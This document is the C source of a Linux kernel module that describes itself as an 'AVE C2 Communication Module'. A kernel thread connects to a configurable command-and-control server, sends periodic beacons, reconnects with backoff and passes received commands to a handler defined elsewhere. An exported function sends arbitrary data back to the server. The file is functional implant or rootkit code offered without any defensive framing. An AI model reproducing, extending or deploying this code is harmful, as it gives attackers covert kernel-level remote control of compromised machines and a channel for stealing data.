#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <linux/slab.h>
#include <linux/uio.h>
#include <linux/string.h>
#include <linux/errno.h>
#include <net/sock.h>
#include <linux/types.h>
#include "c2.h"

#include "kernel.h" 

#define C2_BUFFER_SIZE 512

static char *c2_ip = "127.0.0.1";
static int c2_port = 4444;
static int beacon_interval = 30;       
static int reconnect_interval = 5;       
static int max_reconnect_interval = 60;

module_param(c2_ip, charp, 0644);
MODULE_PARM_DESC(c2_ip, "C2 server IP address");
module_param(c2_port, int, 0644);
MODULE_PARM_DESC(c2_port, "C2 server port");
module_param(beacon_interval, int, 0644);
MODULE_PARM_DESC(beacon_interval, "Beacon send interval (seconds)");
module_param(reconnect_interval, int, 0644);
MODULE_PARM_DESC(reconnect_interval, "Initial reconnect interval (seconds)");
module_param(max_reconnect_interval, int, 0644);
MODULE_PARM_DESC(max_reconnect_interval, "Maximum reconnect interval (seconds)");

static struct task_struct *c2_thread = NULL;
static bool c2_thread_stop = false;
static struct socket *c2_sock = NULL;

int c2_send_data(const char *data, size_t len)
{
	struct msghdr msg;
	struct kvec iov;
	int ret;

	if (!c2_sock) {
		pr_err("C2: Socket not connected\n");
		return -ENOTCONN;
	}

	memset(&msg, 0, sizeof(msg));
	iov.iov_base = (char *)data;
	iov.iov_len  = len;
	ret = kernel_sendmsg(c2_sock, &msg, &iov, 1, len);
	if (ret < 0)
		pr_err("C2: kernel_sendmsg error: %d\n", ret);
	return ret;
}
EXPORT_SYMBOL(c2_send_data);

static int c2_thread_fn(void *data)
{
	struct socket *sock = NULL;
	struct sockaddr_in saddr;
	struct msghdr msg;
	struct kvec iov;
	int ret;
	char *recv_buf;
	unsigned long last_beacon_jiffies;
	int current_reconnect_interval = reconnect_interval;

	recv_buf = kzalloc(C2_BUFFER_SIZE, GFP_KERNEL);
	if (!recv_buf) {
		pr_err("C2: Failed to allocate receive buffer\n");
		return -ENOMEM;
	}

	while (!kthread_should_stop() && !c2_thread_stop) {
		ret = sock_create_kern(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
		if (ret < 0) {
			pr_err("C2: sock_create_kern error: %d\n", ret);
			msleep(current_reconnect_interval * 1000);
			current_reconnect_interval = min(current_reconnect_interval * 2, max_reconnect_interval);
			continue;
		}

		memset(&saddr, 0, sizeof(saddr));
		saddr.sin_family = AF_INET;
		saddr.sin_port = htons(c2_port);
		ret = in4_pton(c2_ip, -1, (u8 *)&saddr.sin_addr.s_addr, -1, NULL);
		if (ret == 0) {
			pr_err("C2: Invalid IP address: %s\n", c2_ip);
			sock_release(sock);
			msleep(current_reconnect_interval * 1000);
			current_reconnect_interval = min(current_reconnect_interval * 2, max_reconnect_interval);
			continue;
		}

		ret = kernel_connect(sock, (struct sockaddr *)&saddr, sizeof(saddr), 0);
		if (ret < 0) {
			pr_err("C2: kernel_connect error: %d\n", ret);
			sock_release(sock);
			msleep(current_reconnect_interval * 1000);
			current_reconnect_interval = min(current_reconnect_interval * 2, max_reconnect_interval);
			continue;
		}

		c2_sock = sock;
		pr_info("C2: Connected to %s:%d\n", c2_ip, c2_port);
		current_reconnect_interval = reconnect_interval;
		last_beacon_jiffies = jiffies;

		while (!kthread_should_stop() && !c2_thread_stop) {
			if (time_after(jiffies, last_beacon_jiffies + beacon_interval * HZ)) {
				const char *beacon = "HELLO_FROM_AVE";
				memset(&msg, 0, sizeof(msg));
				iov.iov_base = (char *)beacon;
				iov.iov_len  = strlen(beacon);
				ret = kernel_sendmsg(sock, &msg, &iov, 1, iov.iov_len);
				if (ret < 0) {
					pr_err("C2: Failed to send beacon: %d\n", ret);
					break;
				}
				pr_info("C2: Beacon sent\n");
				last_beacon_jiffies = jiffies;
			}

			{
				int received;
				memset(&msg, 0, sizeof(msg));
				memset(recv_buf, 0, C2_BUFFER_SIZE);
				iov.iov_base = recv_buf;
				iov.iov_len  = C2_BUFFER_SIZE - 1;
				received = kernel_recvmsg(sock, &msg, &iov, 1, C2_BUFFER_SIZE - 1, MSG_DONTWAIT);
				if (received > 0) {
					recv_buf[received] = '\0';
					pr_info("C2: Received command: %s\n", recv_buf);
					ave_handle_command(recv_buf, received);
				} else if (received == 0) {
					pr_info("C2: Remote closed the connection\n");
					break;
				} else if (received != -EAGAIN && received != -EWOULDBLOCK) {
					pr_err("C2: kernel_recvmsg error: %d\n", received);
					break;
				}
			}
			msleep(500);
		}

		if (c2_sock) {
			sock_release(c2_sock);
			c2_sock = NULL;
		}
		pr_info("C2: Disconnected, reconnecting in %d seconds\n", current_reconnect_interval);
		msleep(current_reconnect_interval * 1000);
		current_reconnect_interval = min(current_reconnect_interval * 2, max_reconnect_interval);
	}

	kfree(recv_buf);
	return 0;
}

int start_c2_comm(void)
{
	int ret;

	if (c2_thread)
		return -EALREADY;
	c2_thread_stop = false;
	c2_thread = kthread_run(c2_thread_fn, NULL, "ave_c2_thread");
	if (IS_ERR(c2_thread)) {
		pr_err("C2: Failed to start communication thread\n");
		ret = PTR_ERR(c2_thread);
		c2_thread = NULL;
		return ret;
	}
	pr_info("C2: Communication thread started\n");
	return 0;
}
EXPORT_SYMBOL(start_c2_comm);

void stop_c2_comm(void)
{
	if (c2_thread) {
		c2_thread_stop = true;
		kthread_stop(c2_thread);
		c2_thread = NULL;
		pr_info("C2: Communication thread stopped\n");
	}
}
EXPORT_SYMBOL(stop_c2_comm);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("AVE");
MODULE_DESCRIPTION("AVE C2 Communication Module - Enhanced");
